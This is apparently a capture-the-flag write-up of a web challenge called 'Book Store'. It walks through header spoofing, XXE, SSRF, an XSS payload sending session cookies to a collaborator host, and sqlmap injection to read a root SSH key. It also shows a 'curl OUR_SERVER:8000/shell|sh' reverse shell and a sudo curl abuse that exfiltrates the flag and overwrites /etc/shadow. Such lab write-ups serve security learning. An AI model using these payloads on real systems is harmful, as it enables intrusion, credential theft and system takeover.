---
description: a challenge by John Hammond
---

# Book Store

In this challenge by John Hammond we are presented with a web site where we can browse book by category, author, and so on.

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

We also have a login form but registration is not active at the moment.

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Basic tampering with login form does not reveal anything, so we start with basic recon using tools like `gobuster`.

```
/authors              (Status: 200) [Size: 3773]
/categories           (Status: 200) [Size: 7751]
/dashboard            (Status: 302) [Size: 235] [--> /login?next=%2Fdashboard]
/login                (Status: 200) [Size: 3332]
/logout               (Status: 302) [Size: 229] [--> /login?next=%2Flogout]
/register             (Status: 200) [Size: 3179]
/sitemap.xml          (Status: 200) [Size: 915]
```

We observe that we can browse

* by category `/categories/38940c5d-6332-4328-84b3-2acef194cb8b`
* by book inside a given category: `/categories/38940c5d-6332-4328-84b3-2acef194cb8b/books/1`

Looking at `/sitemap.xml` we notice eight categories, while in home page we only had seven. If we try to access the "hidden" category `/categories/2d340d76-cc36-4554-9d40-577e164603dd` we get an error message:

```json
{
  "error" : "Sorry, these items are not available in your region. This area is only accessible by local staff or specific geographic locations."
}
```

We can bypass this restriction adding an `X-Forwarded-For: 127.0.0.1` header.

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Moreover, we can edit books with id 7 and 8:

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

With this edit functionality we have a classic XXE vulnerability (that can give us /etc/hosts) and a SSRF in the `coverImageUrl` parameter.

By looking at `/etc/hosts` with the XXE vulnerability we discover an api host. We can do some recon there and we discover (using the SSRF) the `http://api/swagger.json`. A careful study of the api functionality highlights the following endpoint.

```
/categories/2d340d76-cc36-4554-9d40-577e164603dd/books/7/submit-ticket-request-for-review
```

So maybe we can edit a book and trigger some bot action if we submit that book for review.

The plot now is:

1. edit book id 7 inserting a XSS parameter:

```xml
<book>
    <title>Test Book A</title>
    <author>Alan Turing</author>
    <description>&lt;img src=x onerror="this.src='//COLLAB/?'+btoa(document.cookie); this.removeAttribute('onerror');"&gt;</description>
    <price>1.0</price>
    <publishDate>2024-02-29</publishDate>
    <coverImageUrl>http://example.com/cover7.jpg</coverImageUrl>
</book>
```

2. edit book id 8 asking for review of book id 7:

```xml
   <coverImageUrl>http://api/categories/2d340d76-cc36-4554-9d40-577e164603dd/books/7/submit-ticket-request-for-review</coverImageUrl>
```

Our collaborator receives a GET request with session cookies:

```
GET /?c2Vzc2l... HTTP/1.1
```

With this cookie we have access to the book store dashboard

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

where we see two functionalities: edit book, and apparently run commands on the db server (but we need an SSH private key which we do not have).

We probably have a SQL injection with requests like:

```
POST /add-book HTTP/1.1
title=1&category_id=2&author_id=3&description=4&price=1&cover_image_url=&publish_date=2024-04-05"

{"error":"Error: 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\"2024-04-05\"\",TRUE)' at line 1"}
```

Easiest way to proceed is saving a complete HTTP request to `/add-book` endpoint and run a `sqlmap -r --batch`:

```
sqlmap identified the following injection point(s) with a total of 640 HTTP(s) requests:
---
Parameter: title (POST)
    Type: boolean-based blind
    Title: MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)
    Payload: title=1" AND ELT(4932=4932,9451) AND "Wduy"="Wduy&category_id=2&author_id=3&description=4&price=1&cover_image_url=&publish_date=2024-04-05

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: title=1" AND GTID_SUBSET(CONCAT(0x717a7a6b71,(SELECT (ELT(1936=1936,1))),0x7171627a71),1936) AND "jhTF"="jhTF&category_id=2&author_id=3&description=4&price=1&cover_image_url=&publish_date=2024-04-05

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: title=1" AND (SELECT 9182 FROM (SELECT(SLEEP(5)))unLE) AND "Wdxu"="Wdxu&category_id=2&author_id=3&description=4&price=1&cover_image_url=&publish_date=2024-04-05
```

Armed with this knowledge we get db container root ssh key: `sqlmap -r req.txt --batch --file-read /root/.ssh/id_rsa` and we can get a reverse shell on it:

```
POST /database-debug HTTP/1.1
...
ssh_private_key=-----BEGIN+OPENSSH+PRIVATE+KEY-----...&command=id


{"message":"Command ran successfully, output: b'uid=0(root) gid=0(root) groups=0(root)\\n'"}
```

Here we get an api admin token:

```bash
root@db:~# cat .api_admin_token.txt
JVU...
```

Now for simplicity we download a static curl binary on db container and we attack the `/other/debug-exec` endpoint on api container:

```bash
wget https://github.com/moparisthebest/static-curl/releases/download/v8.7.1/curl-amd64
chmod +x curl-amd64

./curl-amd64 -H 'Content-Type: application/json' --data '{"command":"curl OUR_SERVER:8000/shell|sh","admin_token":"JVU..."}' http://api/other/debug-exec
```

Once we have a reverse shell on api container we look at `.bash_history` where we get ssh password for accessing the main www container

```bash
root@api:~# cat .bash_history
ls
whoami
ls
cd /tmp
pwd
sshpass -p ****** ssh www-admin@www
cd
date
ls
```

We now have a couple of options:

```
www-admin@www:~$ ps -edaf
UID          PID    PPID  C STIME TTY          TIME CMD
root           1       0  0 06:48 ?        00:00:00 /bin/sh -c service ssh start && .echo "; use 'www', 'api',
root           7       1  0 06:48 ?        00:00:00 su www-admin -c python3 -m flask run --host=0.0.0.0 --port
root           8       1  0 06:48 ?        00:00:01 python3 -m http.server --bind 127.0.0.1 80
www-adm+      15       7  1 06:48 ?        00:01:04 python3 -m flask run --host=0.0.0.0 --port=5000
root          18       1  0 06:48 ?        00:00:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
root        6844      18  0 07:58 ?        00:00:00 sshd: www-admin [priv]
www-adm+    6851    6844  0 07:58 ?        00:00:00 sshd: www-admin@pts/0
www-adm+    6852    6851  0 07:58 pts/0    00:00:00 -bash
www-adm+    6859    6852  0 07:59 pts/0    00:00:00 ps -edaf


www-admin@www:~$ sudo -l
[sudo] password for www-admin:
Matching Defaults entries for www-admin on www:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User www-admin may run the following commands on www:
    (ALL) /usr/bin/curl 127.0.0.1/*
```

1. we have a web server running as root listening on `127.0.0.1:80`. The document root is `/app`, where we have write permissions, so we can simply link /root/flag.txt and grab the flag:

```bash
cd /app
ln -s /root/flag.txt
curl 127.0.0.1/flag.txt
```

2. we can leverage curl to exfiltrate the root flag with a command like: `sudo curl 127.0.0.1/=@/root/flag.txt -F data=@/root/flag.txt MY_IP:8000`
3. we can use curl to overwrite `/etc/shadow` and get a shell as root:

```bash
cd /app
ln -s /etc/shadow
curl 127.0.0.1/shadow -o pwn
sed -i -e 's/\*//' pwn
sudo curl 127.0.0.1/pwn -o /etc/shadow
su -
root@www:~# id
uid=0(root) gid=0(root) groups=0(root)
```

![](<../../.gitbook/assets/image (7).png>)
